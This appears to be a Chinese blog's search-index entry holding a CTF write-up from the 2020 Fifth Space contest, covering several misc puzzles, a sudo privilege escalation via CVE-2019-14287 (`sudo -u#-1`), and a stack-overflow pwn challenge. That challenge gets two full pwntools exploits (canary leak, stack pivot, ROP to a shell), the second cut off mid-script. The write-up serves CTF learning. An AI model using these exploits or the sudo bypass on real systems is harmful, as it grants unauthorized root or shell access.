<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>记第五空间比赛</title>
    <url>/2020/06/24/ji-di-wu-kong-jian-bi-sai/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次比赛跟去年比起来，难度提高了一些，去年参加的队伍相对比较少，然后竞争也没有这次激烈！今年很多高校和强队都参与进来了！</p>
<p>pwn有队内大佬做，本菜被安排的直接做misc，包括签到一共6道misc，一共出了5道（肯定包括简单的签到了,哈哈），还有一道mc不多说了，一共才三个队做出来，逆向发现里面有xxtea加密，而且是混合加密，远远超出我范围。</p>
<p>但是毕竟是学pwn的，所以pwn的题肯定是要做的。</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h2><p>名字是循环，解压得到file文件，zip格式。解压file得到tarfile文件，TAR格式。继续解压tarfile得到zipfile,zip格式。然后不断循环下去。</p>
<p>写个shell脚本循环解压。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/sh

unzip file

#while [ $? -eq 0 ]:#判断最后一个命令的退出状态是否为0
while [ $? = 0 ]:
do
    tar -xf tarfile;rm tarfile
    unzip zipfile;rm zipfile
done</code></pre>
<p>会得到一个flag文件，里面是flag。</p>
<h2 id="philosopher"><a href="#philosopher" class="headerlink" title="philosopher"></a>philosopher</h2><p>这个名字就很哲学♂ ，解压之后得到philosopher.exe。</p>
<p><img src="image-20200624225848482.png" alt=""></p>
<p>里面隐藏了gif文件，用foremost处理得到一个exe文件夹和一个gif文件夹。</p>
<p><img src="image-20200624230211587.png" alt=""></p>
<p>一开始很容易被gif文件夹里面的内容所吸引，然后进去看哲学。</p>
<p>但是真正的flag在exe文件夹下的00000000.exe中，里面包含一个FL4G文件夹，其中的105文件是损坏的PNG文件。</p>
<p><img src="image-20200624230457081.png" alt=""></p>
<p>用101editor打开105文件。</p>
<p><img src="image-20200624230826845.png" alt=""></p>
<p>明显看到一个IHDR块，PNG文件头数据块，PNG文件格式可以参考<a href="https://ctf-wiki.github.io/ctf-wiki/misc/picture/png-zh/" target="_blank" rel="noopener">CTF wiki</a>。前八个字节是89 50 4E 47 0D 0A 1A 0A。</p>
<p><img src="image-20200624231533571.png" alt=""></p>
<p>所以修改前八个字节，这里只需要修改前四个字节就可以修复PNG文件，给105加上文件后缀名.png就能得到flag了，flag藏在PNG文件中。</p>
<p><img src="image-20200624231420977.png" alt=""></p>
<p>flag{come_with_me_philosopher}</p>
<p>很哲学！出题人的还在flag中要求come_with_me_philosopher！</p>
<h2 id="run"><a href="#run" class="headerlink" title="run"></a>run</h2><p>解压得到一个run.exe。能够直接运行是一个word文件，内容是Error！！！。</p>
<p><img src="image-20200624232126770.png" alt=""></p>
<p>老规矩，利用binwalk看下里面有啥，里面东西挺杂的。</p>
<p><img src="image-20200624232230261.png" alt=""></p>
<p>直接将run.exe提取到本地，里面还含有一个run.exe。</p>
<p><img src="image-20200624232657827.png" alt=""></p>
<p>继续查看run.exe，发现其中含有TIFF格式的图片。</p>
<p><img src="image-20200624232935652.png" alt=""></p>
<p>可以利用dd手工将文件提取出来，也可以将其放入windows中运行能够能够获得一个tif文件。后缀名改为.tiff。能够发现一个图片感觉像是少了一块。</p>
<p><img src="image-20200624233243232.png" alt=""></p>
<p>拖入PS中，发现有两个图层。</p>
<p><img src="image-20200624233349167.png" alt=""></p>
<p>不显示其中一个，就能将黑色部分展示出来。</p>
<p><img src="image-20200624233504593.png" alt=""></p>
<p>这段代码就是将flag中偶数位字符加1，奇数位字符减1。逆着过来就是将处理过的flag偶数位减1，奇数位加一。</p>
<p>首先需要找到处理过的flag，flag应该在图片中了，利用strings将大于15的字符打印出来。<code>strings -n 15 tif</code>。在最末尾找到一串奇怪的字符串<code>njCp1HJBPLVTxcMhUHDPwE7mPW</code>。然后利用偶数位减1，奇数位加一的方法得到flag为<code>mkBq0IICOMUUwdLiTICQvF6nOX</code>。因为字符串可以用下标寻址。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>

a <span class="token operator">=</span> <span class="token string">"njCp1HJBPLVTxcMhUHDPwE7mPW"</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i<span class="token operator">%</span><span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span> <span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> flag</code></pre>
<p>flag{mkBq0IICOMUUwdLiTICQvF6nOX}</p>
<p>如果不放心可以把所有长度大于15的字符串都转换，然后试试就行了。strings -n 15 tif &gt; flag.txt</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>

f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'./flag.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>
strings <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
strings<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> strings<span class="token punctuation">:</span>
    <span class="token keyword">for</span> q <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> q<span class="token operator">%</span><span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">[</span>q<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span> <span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">[</span>q<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> flag
    flag <span class="token operator">=</span> <span class="token string">""</span></code></pre>
<h2 id="麒麟系统"><a href="#麒麟系统" class="headerlink" title="麒麟系统"></a>麒麟系统</h2><p>题目给出了提示，并且给了ssh进去的用户名和端口，明确要求提权root权限。然后访问/root/flag，获取其中内容。</p>
<p><img src="image-20200625000455103.png" alt=""></p>
<p>利用去年爆出的sudo（super user do）提权漏洞，ssh 登陆进去之后，利用sudo -u#-1就能获得root权限。这个漏洞利用前提是：用户首先需要为某个能执行其他的命令配置好sudoer文件。例如通过在<code>/etc/sudoers</code>添加下面的命令可以让用户test以非root身份运行/usr/bin/vim和/usr/bin/id。</p>
<pre class=" language-sh"><code class="language-sh">test ALL = (ALL, !root) /usr/bin/vim
test ALL = (ALL, !root) /usr/bin/id</code></pre>
<p>对于test用户，可以使用带-u参数的sudo命令来指定运行命令的身份，例如，下面的命令将以用户beer的身份启动vim。</p>
<pre class=" language-sh"><code class="language-sh">sudo -u beer vim</code></pre>
<p>在linux创建用户时，每个用户都有一个UID。0是root，1000一般是用户。在使用sudo命令的时候也可以指定用户的UID来代替用户名。例如</p>
<pre class=" language-sh"><code class="language-sh">sudo -u#1000 vim</code></pre>
<p>就是指定用户test什么启动vim。</p>
<p>但是如果用户在使用sudo命令时指定UID为-1或者4294967295时，会以root身份执行命令，因为命令在将UID转化为对应用户的时候，会将这两个异常数字是为0，而0是root用户的id。这样导致了权限提升。</p>
<p><strong><em>该漏洞影响范围内非常有限，只能在非标准配置的Linux下生效，大多数Linux服务器不受影响</em></strong></p>
<p>漏洞参考<a href="https://www.sudo.ws/alerts/minus_1_uid.html" target="_blank" rel="noopener">链接</a>，CVE号是<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287" target="_blank" rel="noopener">CVE-2019-14287</a></p>
<p><code>sudo -u#-1 cat /root/flag</code>就能获取flag了。</p>
<p>最后得到的flag{Bravo KYLIN-USER! Congratulations}</p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h2><p>正常的栈溢出漏洞，正常流程可以puts两次，第一次通过覆盖canary最低字节’\x00’，打印出canary以及栈地址。第二次利用栈溢出迁移栈空间到输入的位置，并且泄漏libc地址，进而得到libc中system和\bin\sh的地址。然后调用system(‘\bin\sh’)，getshell。</p>
<p>checksec发现开了以下的保护，canary，NX，Partial RELRO。</p>
<p><img src="image-20200627202425998.png" alt=""></p>
<p>IDA反编译查看程序执行流程，存在两次输入并输出的机会，同时可以发现很明显的溢出漏洞read函数中，s的大小是rbp-60h。v3经过sub_40076D(80)。</p>
<p><img src="image-20200627204115689.png" alt=""></p>
<p>第一次返回v2=89，第二次v2=112。都大于s的大小0x60=80。</p>
<p><img src="image-20200627204819993.png" alt=""></p>
<p>涉及到的知识点：</p>
<ul>
<li>puts函数遇到\x00截断，并且在结尾会加上一个换行，在交互的时候需要注意</li>
<li>利用leave指令进行栈迁移，leave = move ebp,esp; pop ebp。需要考虑到pop ebp也要弹8个字节，所以应该构造的ebp应该是stack-0x70-8</li>
<li>泄露libc中的地址,然后利用<a href="https://libc.nullbyte.cat/" target="_blank" rel="noopener">libc database search</a>或者LibcSearcher找到libc，然后得到system和/bin/sh的偏移</li>
</ul>
<p>整个exp如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! /usr/bin/env python</span>
<span class="token comment" spellcheck="true">#coding:utf-8</span>

<span class="token comment" spellcheck="true">##############################################</span>
<span class="token comment" spellcheck="true"># @Filename: exp.py</span>
<span class="token comment" spellcheck="true"># @Author:   The Hawks</span>
<span class="token comment" spellcheck="true"># @Date:     2020-06-27 22:00:11</span>
<span class="token comment" spellcheck="true"># @Email:    the_hawks@foxmail.com</span>
<span class="token comment" spellcheck="true">##############################################</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#context(arch='amd64/i386', os='linux', log_level='debug')</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./pwn'</span>
local <span class="token operator">=</span> <span class="token boolean">False</span>
<span class="token comment" spellcheck="true">#local = True</span>
<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"121.36.59.116"</span><span class="token punctuation">,</span><span class="token string">"9999"</span><span class="token punctuation">)</span>
code <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>

sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
sda <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token operator">=</span><span class="token number">4096</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># First time cover canary lowest byte to leak canary</span>
    payload <span class="token operator">=</span> <span class="token number">0x59</span> <span class="token operator">*</span> <span class="token string">'A'</span>
    sda<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token number">0x59</span> <span class="token operator">*</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
    canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'canary: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\nstack: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Second time overflow to migrate stack and leak libc and ret2 main</span>
    pop_rdi <span class="token operator">=</span> <span class="token number">0x400923</span>
    leave_ret <span class="token operator">=</span> <span class="token number">0x400879</span>
    puts_got <span class="token operator">=</span> code<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
    puts_plt <span class="token operator">=</span> code<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
    main <span class="token operator">=</span> code<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">,</span> puts_got<span class="token punctuation">,</span> puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack<span class="token number">-0x70</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>

    sda<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    system <span class="token operator">=</span> puts_addr<span class="token number">-0x2a300</span>
    binsh <span class="token operator">=</span> puts_addr <span class="token operator">+</span> <span class="token number">1169095</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\nbinsh: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Third time regain canary and stack</span>
    sda<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x59</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x59</span><span class="token punctuation">)</span>
    canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># canary won't change,but stack change</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'canary: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\nstack: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Last time system('\bin\sh')</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token number">-0x70</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
    sda<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>

exploit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>另外一种方法就是利用ibc_csu_init中的这段通用gadget来读取调用read函数来读取flat(pop_rdi,/bin/sh,system)到下一个ret的地址。</p>
<p><img src="image-20200628000008315.png" alt=""></p>
<p>需要注意的是read函数拷贝的地址是在0x400924的ret时的栈顶位置，在这之前rsp加了8*7个字节。运行到0x400924的ret时，rsp到了stack+0x20的位置。</p>
<p>exp如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token comment" spellcheck="true"># coding=utf-8</span>

<span class="token comment" spellcheck="true">##############################################</span>
<span class="token comment" spellcheck="true"># @Filename: exp_csu.py</span>
<span class="token comment" spellcheck="true"># @Author:   The Hawks</span>
<span class="token comment" spellcheck="true"># @Date:     2020-06-27 22:41:05</span>
<span class="token comment" spellcheck="true"># @Email:    the_hawks@foxmail.com</span>
<span class="token comment" spellcheck="true">##############################################</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#context(arch='amd64/i386', os='linux', log_level='debug')</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['/usr/bin/tmux','splitw','-h']</span>
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./pwn'</span>
<span class="token comment" spellcheck="true">#local = False</span>
local <span class="token operator">=</span> <span class="token boolean">True</span>
<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"121.36.59.116"</span><span class="token punctuation">,</span><span class="token string">"9999"</span><span class="token punctuation">)</span>
code <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>

sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
sda <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token operator">=</span><span class="token number">4096</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dbgya</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> io<span class="token punctuation">.</span>pid
    <span class="token comment" spellcheck="true">#gdb.attach(io)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    raw_input<span class="token punctuation">(</span><span class="token string">'debug:'</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> <span class="token string">"b *"</span> <span class="token operator">+</span> addr<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">call_function</span><span class="token punctuation">(</span>call_address<span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> p3<span class="token punctuation">)</span><span class="token punctuation">:</span>
    pl <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x40091A</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> p64<span class="token punctuation">(</span>call_address<span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> p64<span class="token punctuation">(</span>p3<span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> p64<span class="token punctuation">(</span>p2<span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> p64<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400900</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> pl

<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># First time cover canary lowest byte to leak canary</span>
    payload <span class="token operator">=</span> <span class="token number">0x59</span> <span class="token operator">*</span> <span class="token string">'A'</span>
    sda<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token number">0x59</span> <span class="token operator">*</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
    canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'canary: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\nstack: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Second time overflow to migrate stack and ret2 read</span>
    pop_rdi <span class="token operator">=</span> <span class="token number">0x400923</span>
    leave_ret <span class="token operator">=</span> <span class="token number">0x400879</span>
    puts_got <span class="token operator">=</span> code<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
    puts_plt <span class="token operator">=</span> code<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
    read_got <span class="token operator">=</span> code<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
    main <span class="token operator">=</span> code<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>

    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">,</span> puts_got<span class="token punctuation">,</span> puts_plt<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># stack+0x20 = stack-0x18+7*8</span>
    payload <span class="token operator">+=</span> call_function<span class="token punctuation">(</span>read_got<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> stack<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack<span class="token number">-0x70</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#dbgya()</span>
    sda<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>
